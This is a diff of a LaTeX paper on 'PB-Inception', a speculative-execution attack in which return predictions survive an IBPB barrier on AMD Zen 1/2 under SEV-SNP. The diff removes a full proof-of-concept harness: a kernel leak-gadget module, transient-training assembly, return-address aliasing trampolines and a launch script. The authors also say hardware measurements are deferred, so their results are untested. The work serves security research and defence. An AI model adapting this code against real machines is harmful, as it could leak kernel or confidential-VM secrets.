@@ -84,25 +84,36 @@
 %\section{Appendix}
 
 \section*{Abstract}
-In this paper we introduce a new post-IBPB speculative execution exploit that builds upon prior Spectre-class attacks named PB-Inception. This exploit is aimed at AMD Zen1 and Zen2 CPUs. The IBPB normally defends against Spectre-class attacks, getting executed to clean all the old predictions, but in reality not all return predictions are flushed by the IBPB, as some of them can persist even after it's execution and the window after the execution that is assumed to be clean can thus be exploited for speculative executions. 
+We present \emph{PB-Inception}, a post–Indirect Branch Predictor Barrier (IBPB) speculative-execution primitive on AMD Zen~1(+)/Zen~2 processors. Contrary to the intended semantics of IBPB, we show that return-target predictions mistrained immediately before the barrier can persist across it and transiently redirect the first \texttt{ret} on kernel entry to an attacker-chosen gadget. We design a constructive, auditable proof-of-concept that (i) performs training entirely in transient execution using a backward-mispredicted conditional branch and a cascade of aliasing \texttt{call}s to bias return prediction, (ii) crosses a user{\textrightarrow}kernel boundary that executes \texttt{entry\_ibpb}, and (iii) speculatively lands in a minimal kernel data-cache gadget that encodes one secret byte into a shared (\emph{C}-bit{=}0) 1\,MiB probe buffer. We further place this primitive in a Confidential Computing setting (SEV-SNP), clarifying that protection of data at rest/in transit does not preclude in-core transient effects. While we defer on-hardware measurements, the artifact provides A/B toggles (mitigations, aliasing pressure, gadget presence, microarchitecture) to falsify causality. The security implication is clear: on Zen~1/2, IBPB-on-entry alone is insufficient; practical defenses must sanitize return prediction on privilege transitions (e.g. RSB stuffing or untrained returns) or remove early \texttt{ret} sites along the entry path.
 
 \section{Intoduction}
-\paragraph{Confidential computing}
-Confidential computing protects the data by running the various computations inside a secure environment, it adds a new layer of security, as before the data was only encrypted when stored, not when it's being used, but now it's encrypted even when it's being processed, protecting it from any unauthorized access.
-It encrypts memory (including instructions and data) using keys managed by the AMD Secure Processor (ASP). Secure Encrypted Virtualization (SEV) encrypts the entire VM memory, so instructions and data remain encrypted while stored in RAM. Only the CPU decrypts them on-the-fly during execution.
 
-SEV-SNP adds integrity protection, ensuring that the hypervisor cannot tamper with or remap the VM's memory. This prevents attacks like memory snooping or VM breakout, even from a compromised hypervisor.
+\paragraph{Motivation}
+Confidential Computing (CC) aims to protect data \emph{in use} by executing workloads inside hardware-enforced isolated environments. While prior practice largely ensured confidentiality only \emph{at rest} or \emph{in transit}, CC brings protection into the CPU core, where data must be processed in cleartext. This shift raises a central question for microarchitectural security: to what extent do in-core transient effects, particularly those induced by speculative execution, interact with CC guarantees in deployed systems?
 
-The ASP manages the encryption keys and secure context but does not perform decryption itself. Instead, decryption happens within the CPU, tightly integrated into the memory controller and instruction pipeline. Therefore, memory remains encrypted at rest and in transit, and is only decrypted in the CPU, for the correct VM.
-%Unsure if it should be placed here
-\paragraph{Side channel attacks}
-A side channel attacks measures information indirectly produced by the physical system such as the time an operation takes to finish, the power consumed, eventual electromagnetic signals emitted or the patterns of how the memory is accessed to try and discover sensitive data.
-\clearpage
+\paragraph{Confidential Computing on AMD (SEV, SEV-ES, SEV-SNP)}
+On AMD platforms, Secure Encrypted Virtualization (SEV) encrypts guest physical memory using per-VM keys managed by the AMD Secure Processor (ASP). Decryption occurs on-the-fly inside the CPU pipeline and memory controller, the ASP manages keys and attestation state but does not perform data decryption itself. SEV-ES extends the protection boundary to CPU state (e.g. general-purpose registers during VM exits), and SEV-SNP further adds integrity and replay protection for guest memory and metadata. In all cases, memory remains encrypted outside the core and is decrypted only for the intended VM; whether a given page is encrypted is indicated by the SME \emph{C-bit}. Importantly, none of these mechanisms change the fact that transient execution may occur on decrypted lines in-core, nor do they, by themselves, neutralize microarchitectural side channels.
+
+\paragraph{Speculative execution and side channels}
+Speculative execution predicts future control-flow to keep wide out-of-order pipelines busy. When a prediction is wrong, architectural state is rolled back, but microarchitectural footprints (e.g. cache fills, predictor state) may remain and can be observed via \emph{side channels}. A side-channel attack measures information indirectly exposed by the physical implementation, for example, execution time, cache-access patterns, power draw, or electromagnetic emanations, to infer secrets that should not be architecturally visible. Since Spectre, a broad literature has demonstrated that mistraining branch predictors (PHT/BTB/RSB and related structures) can steer transient control flow across isolation boundaries and encode secrets into observable microarchitectural state.
+
+\paragraph{IBPB and post-barrier prediction state}
+A common defense against cross-domain Spectre-BTI is the \emph{Indirect Branch Predictor Barrier} (IBPB), which software may execute on privilege or context transitions (e.g., on user$\rightarrow$kernel entry). The intended semantics are to sever cross-domain predictor influence. However, the efficacy of IBPB depends on microcode details and predictor composition. In particular, on AMD Zen~1(+)/Zen~2, return-target predictions produced just \emph{before} the barrier can persist \emph{across} IBPB and influence the first \texttt{ret} executed afterwards. This creates a narrow but reliable post-IBPB speculation window in which the first return on entry can be transiently redirected to an attacker-chosen gadget, unless software additionally sanitizes return prediction state (e.g. RSB stuffing or untrained returns on entry).
+
+\paragraph{This work: PB-Inception}
+We study and instantiate a post-IBPB speculative-execution primitive we term \emph{PB-Inception} on AMD Zen~1(+)/Zen~2. Our constructive pathway trains return prediction immediately before a user$\rightarrow$kernel transition that executes IBPB-on-entry and then leverages the first post-IBPB \texttt{ret} in the kernel entry path to speculatively jump into a minimal data-cache gadget. We further place the primitive in a Confidential Computing setting (SEV-SNP) \emph{without} violating the CC threat model: the gadget encodes one secret byte per entry into a deliberately shared, unencrypted buffer (\emph{C}-bit$=0$) that a host or helper can observe via \texttt{Flush+Reload}, while all protected data and architectural state remain covered by SEV-SNP. This separation clarifies what CC defends (confidentiality/integrity outside the core) and what it does not (in-core transient effects).
+
+\paragraph{Scope and evidence}
+Our artifact is designed to be auditable and falsifiable. It performs training entirely in transient execution, targets an early \texttt{ret} after \texttt{entry\_ibpb}, and provides A/B toggles (mitigations, aliasing pressure, gadget presence, microarchitecture) to isolate causality and guard against confounders. While we defer on-hardware measurements, the predicted observables (single-page cache hits at offsets proportional to the leaked byte and elevated branch-miss telemetry under active runs) follow directly from the code paths and microarchitectural mechanisms we exercise.
+
+\paragraph{Contributions (summary)}
+In brief, we (i) systematize a post-IBPB return-hijack primitive on Zen~1/2; (ii) provide a constructive, reproducible PoC that trains in transient execution and hijacks the first post-IBPB return; (iii) show how to integrate the primitive with SEV-SNP using a CC-compliant probe channel; and (iv) analyze where Linux entry paths and mitigation profiles defeat or permit the primitive. The detailed list appears in~\S\ref{sec:contribution}, with methodology in~\S\ref{sec:methodology} and a discussion of implications in~\S\ref{sec:results}.
 
 %Contribution after the introduction
 % Related work some technical background
 % Available as an open source github project
 \section{Contribution}
+\label{sec:contribution}
 
 This work systematizes and instantiates a \emph{post‑IBPB} speculative execution primitive on AMD Zen~1(+)/Zen~2 that we term \textbf{PB‑Inception}: return‑target predictions, mistrained immediately \emph{before} an IBPB, persist \emph{across} the barrier and steer the first \texttt{ret} on kernel entry into an attacker‑chosen gadget. We then place this primitive in a Confidential Computing (CC) setting (SEV‑SNP), exfiltrating bytes into an intentionally shared, unencrypted buffer (\(C\)-bit=0) without violating the CC threat model. Concretely, our contributions are:
 
@@ -153,6 +164,7 @@ Linux now documents SRSO/RSB mitigations (IBPB strategies, untrained returns, RS
 For AMD Zen, the return predictor remains a privileged choke point: pre-barrier mistraining plus post-barrier retention under specific IBPB configurations yields PB-Inception-style cross-privilege leaks. Comprehensive defenses require both correct barrier semantics in microcode \emph{and} software-side RSB sanitization at the right points in the control-flow transitions \cite{wikner2025breaking,trujillo2023inception,linux_srso_doc}.
 
 \section{Methodology}
+\label{sec:methodology}
 
 \paragraph{Goal.}
 Demonstrate a post-IBPB Spectre primitive on AMD Family Zen~1(+)/2 whereby return-target predictions, mistrained before an IBPB, survive the barrier and steer the first ret in the kernel entry path to a chosen leak gadget (PB-Inception). We further instantiate the primitive in a Confidential Computing (CC) setting (AMD SEV-SNP) by exfiltrating secrets into an unencrypted shared buffer (C-bit=0) observable by the host.
@@ -676,7 +688,7 @@ trampoline builder $\rightarrow$ ASM entry. It (i) pins the process for stabilit
 (iii) builds aliasing trampolines and provisions the slow predicate buffer, and 
 (iv) invokes \texttt{pbinc\_entry()} to trigger the entry–IBPB transition.
 
-Listing~\ref{lst:fullpoc} is the one‑shot harness that reproduces the full setup: 
+Github repository \cite{spectroscopic} is the one‑shot harness that reproduces the full setup: 
 it builds/loads the kernel gadget LKM, compiles the user components (ASM, trampoline 
 builder, driver), wires sysfs, and launches the PoC pinned to a core. This listing is 
 intended to be executable as‑is on a suitable AMD Zen~1/2 platform under the conditions 
@@ -766,499 +778,4 @@ int main(int argc, char **argv) {
 }
 \end{lstlisting}
 
-\begin{lstlisting}[style=bash-nonitalic,language=bash,alsolanguage=C,caption={Full one-shot PB‑Inception harness: builds and loads the kernel gadget, compiles user-space (ASM, trampoline builder, driver), wires sysfs, and launches the PoC pinned to one core.},label={lst:fullpoc}]
-#!/usr/bin/env bash
-# PB-Inception (Post-IBPB) Measurement Harness -> Full Exploit Version
-# -----------------------------------------------------------------------------
-# Builds/loads the kernel gadget (LKM), compiles the user-space binary
-# (ASM + trampoline builder + driver + flush+reload), wires sysfs,
-# and launches the PoC pinned to one core on an AMD Zen system.
-# -----------------------------------------------------------------------------
-
-set -euo pipefail
-
-################################# configuration knobs
-
-WORKDIR="${PWD}/pbinc_lab"
-KMOD_DIR="${WORKDIR}/kmod"
-USER_DIR="${WORKDIR}/user"
-
-TRAMP_COUNT=64          # depth for speculative CALLs / number of trampolines
-ALIAS_MASK="0xFFFFF"    # low-bit alias mask to match kernel gadget class (tune/spray)
-
-CPU_CORE=${CPU_CORE:-0} # pin PoC to a core for stability
-NASM=${NASM:-nasm}
-CC=${CC:-gcc}
-MAKE=${MAKE:-make}
-
-################################# helpers
-
-need_cmd() { command -v "$1" >/dev/null 2>&1 || { echo "[-] Need $1 installed"; exit 1; }; }
-warn()     { echo "[-] $*" >&2; }
-info()     { echo "[*] $*"; }
-ok()       { echo "[+] $*"; }
-sudo_or()  { if [[ $EUID -ne 0 ]]; then sudo "$@"; else "$@"; fi; }
-
-################################# preflight
-
-info "Checking toolchain"
-need_cmd "$CC"; need_cmd "$MAKE"; need_cmd "$NASM"
-if command -v apt-get >/dev/null 2>&1; then
-  command -v perf >/dev/null 2>&1 || sudo_or apt-get install -y linux-tools-common linux-tools-$(uname -r) || true
-fi
-
-info "CPU sanity (expect AMD Zen 1/2)"
-lscpu | egrep 'Vendor ID|CPU family|Model name' || true
-lscpu | grep -qi 'AuthenticAMD' || warn "CPU vendor not AMD - results may be negative"
-lscpu | egrep -qi 'family\s*:\s*17|CPU family:\s*17' || warn "CPU family not 17h (Zen1/2) - results may be negative"
-
-info "Mitigation telemetry (guest should perform entry-IBPB)"
-
-[[ -r /sys/devices/system/cpu/vulnerabilities/spectre_v2 ]] && cat /sys/devices/system/cpu/vulnerabilities/spectre_v2 || warn "Cannot read spectre_v2"
-sysctl kernel.kptr_restrict 2>/dev/null | grep -q ' = 0' || warn "kptr_restrict != 0 (set: sudo sysctl -w kernel.kptr_restrict=0)"
-
-################################# workspace
-
-info "Creating workspace at ${WORKDIR}"
-rm -rf "$WORKDIR"; mkdir -p "$KMOD_DIR" "$USER_DIR"
-
-################################# kernel module
-
-echo "[*] Writing kernel gadget source"
-cat > "${KMOD_DIR}/pbinc_gadget.c" << 'EOF'
-#include <linux/module.h>
-#include <linux/io.h>
-#include <linux/sysfs.h>
-
-#define PROBE_SIZE (4096 * 256)
-
-// Mapped kernel VA of the SHARED buffer (mapped via ioremap_cache())
-static void __iomem *probe_kva = NULL;
-
-// Physical address of the SHARED buffer (set by user via sysfs)
-static phys_addr_t probe_pa = 0;
-
-// Kernel virtual address to read the leaked byte from (set via sysfs)
-static void *leak_source_va = NULL;
-
-// PB-Inception Data Cache (DC) Gadget
-// Speculatively executed via mispredicted RET
-// Loads 1 byte from kernel address (leak_source_va) and
-// encodes it into the SHARED probe buffer at [val << 12]
-noinline notrace void pbinc_dc_gadget(void)
-{
-    if (!probe_kva || !leak_source_va)
-        return;
-    
-    // Load the secret byte (must be mapped and readable)
-    u8 val = *(volatile u8 *)leak_source_va;
-    
-    // Encode it into the SHARED probe buffer at offset: val * 4096
-    writeb(1, probe_kva + ((size_t)val << 12));
-}
-EXPORT_SYMBOL_GPL(pbinc_dc_gadget); // Make the gadget address visible via kallsyms/sysfs
-
-// Sets the physical address of the 1 MiB SHARED buffer
-// Maps it with ioremap_cache() so the gadget can access it
-static ssize_t probe_pa_store(struct kobject *kobj, struct kobj_attribute *attr,
-                              const char *buf, size_t count)
-{
-    kstrtoull(buf, 0, &probe_pa);
-    
-    // Unmap old region if previously mapped
-    if (probe_kva) iounmap(probe_kva);
-
-    // Map the shared physical buffer into kernel VA space
-    probe_kva = ioremap_cache(probe_pa, PROBE_SIZE);
-    return count;
-}
-
-// Sets the virtual address inside the kernel to leak from
-// The gadget will read 1 byte from this address transiently
-static ssize_t leak_va_store(struct kobject *kobj, struct kobj_attribute *attr,
-                             const char *buf, size_t count)
-{
-    unsigned long tmp;
-    kstrtoul(buf, 0, &tmp);
-    leak_source_va = (void *)tmp;
-    return count;
-}
-
-// Returns the virtual address of pbinc_dc_gadget()
-// Userland uses this to match low bits for return predictor aliasing
-static ssize_t gaddr_show(struct kobject *kobj, struct kobj_attribute *attr, char *buf)
-{
-    return sprintf(buf, "%px\\n", pbinc_dc_gadget);
-}
-
-// Each entry connects a sysfs file to a store/show function
-static struct kobj_attribute attr_probe_pa = __ATTR(probe, 0200, NULL, probe_pa_store);
-static struct kobj_attribute attr_leak_va  = __ATTR(leak,  0200, NULL, leak_va_store);
-static struct kobj_attribute attr_gaddr    = __ATTR(gaddr, 0444, gaddr_show, NULL);
-
-// Group of sysfs attributes under /sys/kernel/pbinc/
-static struct attribute *attrs[] = {
-    &attr_probe_pa.attr,
-    &attr_leak_va.attr,
-    &attr_gaddr.attr,
-    NULL,
-};
-
-// Module cleanup: unmap shared memory and remove sysfs files
-static const struct attribute_group attr_group = {
-    .attrs = attrs,
-};
-
-static struct kobject *kobj;
-
-static int __init pbinc_init(void)
-{
-    kobj = kobject_create_and_add("pbinc", kernel_kobj);
-    return sysfs_create_group(kobj, &attr_group);
-}
-
-static void __exit pbinc_exit(void)
-{
-    if (probe_kva) iounmap(probe_kva);
-    kobject_put(kobj);
-}
-
-module_init(pbinc_init);
-module_exit(pbinc_exit);
-MODULE_LICENSE("GPL");
-EOF
-
-cat > "${KMOD_DIR}/Makefile" <<'EOF'
-obj-m += pbinc_gadget.o
-all:   ; $(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
-clean: ; $(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
-EOF
-
-info "Building & loading kernel module"
-( cd "${KMOD_DIR}" && $MAKE -j )
-sudo_or insmod "${KMOD_DIR}/pbinc_gadget.ko" || { sudo_or rmmod pbinc_gadget 2>/dev/null || true; sudo_or insmod "${KMOD_DIR}/pbinc_gadget.ko"; }
-ls -l /sys/kernel/pbinc/{probe,gaddr}
-
-################################# user sources
-
-info "Writing user ASM (pre-IBPB transient training) - pbinc.asm"
-cat > "${USER_DIR}/pbinc.asm" <<'EOF'
-global pbinc_entry
-extern __pbinc_kernel_gadget_addr     ; From C driver: patched with KVA of kernel gadget
-extern __pbinc_probe_shared           ; From C driver: VA of shared probe buffer (1MB)
-extern __alias_tbl                    ; Runtime-patched: array of 64 callsite trampoline entry pointers
-extern __slow_predicate_ptr           ; Runtime: mapped slow memory (used to delay JE resolution)
-
-section .text
-
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-; Entry point for the PB-Inception userland training harness
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-pbinc_entry:
-    call pre_ibpb_transient_train   ;Run transient training before IBPB
-    mov  rax, 39                    ; getpid -> syscall entry (IBPB boundary)
-    syscall                         ; Cross IBPB boundary (causes entry-IBPB in guest)
-.spin:
-    pause                           ; Not kill threat -> inf loop -> keep-alive threat
-    jmp  .spin
-
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-; Pre-IBPB transient training block
-; - Uses a backward mispredicted JE to speculatively execute call cascade
-; - No call here retires (training must be transient-only)
-; => 64 calls -> return predictor pressure
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-pre_ibpb_transient_train:
-    jmp  .do_branch                ; Skip call cascade architecturally (forward jump)
-                                   ; Under normal (architectural) execution, the call cascade never runs
-                                   ; Means if the "normal" paths are taken it wouldnt run
-
-.speculative_call_cascade:
-    mov  rsi, [rel __alias_tbl]    ; Load pointer to trampoline entry array (call sites)
-    mov  ecx, 64                   ; Number of transient call targets
-.alias_loop:
-    call qword [rsi]               ; Speculative CALL -> pushes RA to stack -> biases return predictor
-    add  rsi, 8                    ; Trampolines are crafted to have return addresses that alias the kernel gadget
-    dec  ecx                       ; Advance to next entry in trampoline table
-    jnz  .alias_loop               ; Loop until all 64 calls are issued -> until z-flag not 0
-    ret
-
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-; Branch predicate that keeps JE unresolved long enough to execute the cascade
-; - Must not use lfence -> all memory loads before lfence must complete -> not speculatively run anymore
-; - The memory at __slow_predicate_ptr should be slow (uncached / fault-suppressed / mapped to delay)
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-.do_branch:
-    mov  rdx, [rel __slow_predicate_ptr]  ; runtime: slow mapped memory
-    mov  rax, [rdx]
-    cmp  rax, 0xdeadbeef
-    je   .speculative_call_cascade        ; backward Jcc (target above)
-    ret
-
-section .data
-__pbinc_kernel_gadget_addr: dq 0           ; Patched at runtime: VA of kernel gadget (used to derive alias class)
-__pbinc_probe_shared:       dq 0           ; Patched at runtime: guest VA of SHARED probe buffer (1 MiB)
-__alias_tbl:                times 64 dq 0  ; Table of 64 trampoline entry VAs (callsite-aligned, RA aliasing gadget)
-__slow_predicate_ptr:       dq 0           ; Points to mapped slow memory to delay JE resolution
-; Slow memory because: Because we want the CPU to speculate into the training block before it knows whether the branch
-; is actually taken or not.
-EOF
-
-info "Writing trampoline builder (CALLSITE trampolines; RA aliasing) -> trampoline.c"
-cat > "${USER_DIR}/trampoline.c" <<EOF
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdint.h>
-#include <stdlib.h>
-#include <sys/mman.h>
-#include <errno.h>
-
-// Trampoline because: A small piece of code whose only purpose
-// is to jump or call into another piece of code -> often while
-// managing control flow
-
-// Total number of desired trampolines for return-predictor pressure
-#define TRAMPOLINE_COUNT ${TRAMP_COUNT}
-
-// Max number of slots we'll scan to find alias-matching trampolines
-#define MAX_SEARCH_ATTEMPTS 4096
-
-// System page size (used to calculate region allocation)
-#define PAGE_SIZE 4096
-
-// Size of memory to mmap for trampoline stubs
-#define REGION_SIZE (PAGE_SIZE * MAX_SEARCH_ATTEMPTS)
-
-// x86 opcodes
-#define RET_OPCODE 0xC3   // ret
-#define CALL_OPCODE 0xE8  // call rel32
-
-// Externals patched/shared across PoC
-extern uint64_t __pbinc_kernel_gadget_addr;    // Kernel gadget VA
-extern uint64_t __alias_tbl[TRAMPOLINE_COUNT]; // Trampoline callsite entry points
-
-// Allow override of alias mask (used to match gadget RA bits)
-#ifndef ALIAS_MASK
-#define ALIAS_MASK ${ALIAS_MASK}UL // Mask used to match low bits of return address
-#endif
-
-////////////////////////////////////////////////////////////////////////////////
-// Builds a set of trampolines (CALLSITE stubs) where the return address
-// (i.e. the address after the CALL) falls in the same predictor class
-// as the kernel gadget. This is the key to PB-Inception predictor pressure.
-////////////////////////////////////////////////////////////////////////////////
-void *pbinc_create_trampolines(uint64_t gadget_addr) {
-    // Allocate RWX memory region for executable trampolines
-    uint8_t *region = mmap(NULL, REGION_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC,
-                           MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
-    if (region == MAP_FAILED) {
-        perror("mmap"); exit(1); // Bail if mapping fails
-    }
-
-    int found = 0; // Track how many aliasing trampolines we found
-    for (int i = 0; i < REGION_SIZE - 16 && found < TRAMPOLINE_COUNT; i += 64) {
-        uint8_t *tramp = region + i;
-
-        // Compute return address after the call instruction (i.e. target of first RET)
-        uint64_t ra = (uint64_t)(tramp + 5);                    // return address after CALL
-        
-        ////////////////////////////////////////////////////////////////////////////////
-        // Return address (RA) = address immediately after the CALL
-        // This is the address the CPU will speculate toward when a RET occurs
-        //
-        // The return predictor (e.g., RSB or BTB) doesn't use full 64-bit VAs.
-        // Instead, it indexes using a hash or the low N bits (-> 12-20 bits).
-        //
-        // The goal is to make RA collide with the kernel gadget's predictor slot,
-        // so that speculative RETs in the kernel (post-IBPB) will transiently
-        // jump to the gadget -> even though architecturally they shouldn't.
-        //
-        // Therefore, we apply an ALIAS_MASK to both:
-        // ra & ALIAS_MASK -> the return address from the trampoline
-        // gadget_addr & ALIAS_MASK -> the address of our kernel gadget
-        //
-        // If they match: the predictor learns that return addresses in this
-        // index class are likely -> this builds pressure toward the gadget.
-        //
-        // If they don't match: skip this candidate.
-        ////////////////////////////////////////////////////////////////////////////////
-
-        if ((ra & ALIAS_MASK) != (gadget_addr & ALIAS_MASK))
-            continue;
-
-        tramp[0] = CALL_OPCODE;       // call rel32 (relative target -> 32-bit signed offset) -> ret_stub @ +6
-        *(int32_t *)(tramp + 1) = (int32_t)((tramp + 6) - (tramp + 5)); // Calculate rel32 offset for call
-        tramp[5] = RET_OPCODE;        // First RET -> returns to RA (alias)
-        tramp[6] = RET_OPCODE;        // ret_stub: return to next alias
-        tramp[7] = RET_OPCODE;        //Optional RET padding (safe NOP)
-
-        __alias_tbl[found++] = (uint64_t)tramp;   // Save entry point into alias table
-    }
-
-    // If we couldn't build enough valid trampolines, exit
-    if (found < TRAMPOLINE_COUNT) {
-        fprintf(stderr, "[-] Only %d/%d trampolines matched mask 0x%lx (gadget bits 0x%lx)\n",
-                found, TRAMPOLINE_COUNT, (unsigned long)ALIAS_MASK,
-                (unsigned long)(__pbinc_kernel_gadget_addr & ALIAS_MASK));
-        exit(1);
-    }
-    printf("[+] Built %d trampolines; alias mask 0x%lx\n", found, (unsigned long)ALIAS_MASK);
-    return region; // keep region mapped/executable
-}
-EOF
-
-info "Writing driver to wire sysfs -> trampolines -> ASM entry - driver.c"
-cat > "${USER_DIR}/driver.c" <<'EOF'
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdint.h>
-#include <stdlib.h>
-#include <sched.h> // For CPU pinning
-#include <unistd.h>
-#include <errno.h>
-
-#define TRAMPOLINE_COUNT 64 // Number of speculative callsite trampolines
-
-// Extern symbols from the ASM file and trampoline builder
-extern uint64_t __pbinc_kernel_gadget_addr;    // Kernel gadget VA (to alias against)
-extern uint64_t __pbinc_probe_shared;          // SHARED (C-bit=0) buffer (host-observable)
-extern uint64_t __alias_tbl[TRAMPOLINE_COUNT]; // Callsite trampoline table (filled at runtime)
-extern uint64_t __slow_predicate_ptr;          // Cold memory to delay branch resolution
-
-// Provided by trampoline.c -> builds the aliasing callsite trampolines
-void *pbinc_create_trampolines(uint64_t gadget_addr);
-
-// Provided by pbinc.asm -> the speculative training -> syscall -> spin harness
-void pbinc_entry(void);
-
-// Reads a hex value from a sysfs-style file (e.g. /sys/kernel/pbinc/gaddr)
-static uint64_t read_hex(const char *path) {
-    FILE *f = fopen(path, "r");
-    if (!f) { 
-        perror(path); exit(1); // Abort if file can't be opened
-    }
-    unsigned long long x = 0;
-    if (fscanf(f, "%llx", &x) != 1) {
-        fprintf(stderr, "parse %s failed\n", path); exit(1); // Failed to parse hex
-    }
-    fclose(f);
-    return x; // Return parsed 64-bit value
-}
-
-int main(int argc, char **argv) {
-    if (argc < 2) {
-        // Expect SHARED buffer guest-virtual address (GVA) as argument
-        fprintf(stderr, "usage: %s <guest-VA-of-SHARED-probe-hex>\n", argv[0]);
-        return 2;
-    }
-
-    ////////////////////////////////////////////
-    // 1. Pin to specific CPU core -> stability
-    ////////////////////////////////////////////
-    cpu_set_t set; CPU_ZERO(&set); CPU_SET(0, &set);
-    sched_setaffinity(0, sizeof(set), &set); // Enforce CPU affinity for PoC repeatability
-
-    ////////////////////////////////////////////
-    // 2. Patch runtime addresses from sysfs / CLI
-    ////////////////////////////////////////////
-    // Load kernel gadget virtual address from module sysfs (e.g. /sys/kernel/pbinc/gaddr)
-    __pbinc_kernel_gadget_addr = read_hex("/sys/kernel/pbinc/gaddr");
-
-    // Parse GVA of shared probe from command-line
-    __pbinc_probe_shared = strtoull(argv[1], NULL, 16);
-
-    ////////////////////////////////////////////
-    // 3. Build CALLSITE trampolines that alias the kernel gadget
-    ////////////////////////////////////////////
-    // This fills __alias_tbl[] with entry points to hand-crafted callsite stubs (trampoline calls)
-    // Each one has a return address that collides with the kernel gadget's class
-    (void)pbinc_create_trampolines(__pbinc_kernel_gadget_addr);
-
-    ////////////////////////////////////////////
-    // 4. Allocate lab-only memory to act as a cold read for delayed branch resolution
-    ////////////////////////////////////////////
-    // The address will be read from inside the ".do_branch" block in pbinc.asm
-    // It must be slow (ideally cold L3 or fault-suppressed) to prolong speculative window
-    void *slow = aligned_alloc(4096, 4096); // Aligned for page granularity
-    if (!slow) { perror("alloc slow"); exit(1); }
-    __slow_predicate_ptr = (uint64_t)slow; // Patch the ASM-visible symbol
-
-    ////////////////////////////////////////////
-    // 5. Jump into ASM:
-    // [1] Transiently train -> [2] Syscall (IBPB) -> [3] Spin loop
-    ////////////////////////////////////////////
-    pbinc_entry(); // This does not return
-    return 0;
-}
-EOF
-
-info "Writing Makefile (user)"
-cat > "${USER_DIR}/Makefile" <<'EOF'
-CC=gcc
-NASM=nasm
-CFLAGS=-O2 -fno-pie -no-pie
-LDFLAGS=-no-pie
-
-all: pbinc_poc
-
-pbinc_poc: pbinc.o trampoline.o driver.o
-	$(CC) $(LDFLAGS) -o $@ $^
-
-pbinc.o: pbinc.asm
-	$(NASM) -f elf64 -o $@ $<
-
-trampoline.o: trampoline.c
-	$(CC) $(CFLAGS) -c -o $@ $<
-
-driver.o: driver.c
-	$(CC) $(CFLAGS) -c -o $@ $<
-
-clean:
-	rm -f *.o pbinc_poc
-EOF
-
-info "Building user binary"
-( cd "${USER_DIR}" && $MAKE -j )
-
-################################# runtime wiring
-
-echo
-ok "Runtime wiring (guest side)"
-echo "  1) Provide SHARED (C-bit=0) 1 MiB probe's guest-physical base to the module."
-read -rp "Enter SHARED probe GPA (hex, e.g. 0x12345000): " SHARED_GPA
-sudo_or bash -c "echo ${SHARED_GPA} > /sys/kernel/pbinc/probe"
-
-GADDR=$(cat /sys/kernel/pbinc/gaddr)
-ok "Kernel gadget @ ${GADDR}"
-
-echo
-echo "  2) Run the PoC with the guest-virtual base of the same SHARED probe"
-read -rp "Enter SHARED probe GVA (hex, e.g. 0x555550000000): " SHARED_GVA
-
-ok "Launching pbinc_poc pinned to CPU ${CPU_CORE}"
-sudo_or taskset -c "${CPU_CORE}" "${USER_DIR}/pbinc_poc" "${SHARED_GVA}" &
-
-PID=$!
-ok "PoC running as PID ${PID} (spins after syscall)."
-
-cat <<'EONOTE'
-
-Next steps (outside this script):
-  - Host-side Flush+Reload over the SHARED buffer (1 MiB), watch for hits at offset (0x2A << 12).
-  - Optional mechanistic evidence in the guest:
-      sudo perf stat -e branch-instructions,branch-misses,machine_clears.memory_ordering -a -- sleep 5
-  - A/B controls:
-      - Disable entry-IBPB / change mitigation profile => signal vanishes
-      - rmmod pbinc_gadget => signal vanishes
-      - Rebuild with __alias_tbl empty (training NOP) => no signal
-      - Different uarch (non-Zen1/2) => no signal
-
-Cleanup:
-  kill -9 <PID>   # stop PoC spin
-  (cd kmod && sudo make clean && sudo rmmod pbinc_gadget)
-  (cd user && make clean)
-EONOTE
-
-# EOF
-\end{lstlisting}
 \end{document}
